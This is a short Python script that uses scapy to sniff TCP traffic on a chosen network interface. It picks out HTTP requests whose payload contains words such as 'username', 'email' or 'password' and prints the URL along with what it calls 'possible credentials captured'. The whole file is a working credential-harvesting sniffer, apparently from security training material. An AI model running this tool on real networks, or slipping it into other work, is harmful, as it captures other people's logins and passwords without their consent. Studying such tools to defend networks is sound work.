#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet, filter="tcp")  # prn= callback
    # available filters
    # bps syntax https://biot.com/capstats/bpf.html
    # port 21
    # udp
    # tpc


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load
            keywords = ['username', 'uname', 'uid', 'user', 'email', 'mail', 'userid', 'id', 'login', 'password', 'pass']
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            for word in keywords:
                if word.encode() in payload:  # word.encode() to turn the string into bytes #Req!
                    print('[+] HTTP Request >> ' + url.decode())
                    print('[+] Possible credentials captured :', payload.decode(), end='\n')
                    break


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--iface', dest='iface', help='Interface to sniff on')
    option = parser.parse_args()
    if not option.iface:
        parser.error('[+] Please specify an interface to sniff on')
    else:
        return option.iface


interface = get_arguments()
try:
    sniff(interface)
except KeyboardInterrupt:
    print('[-] Program finished...')
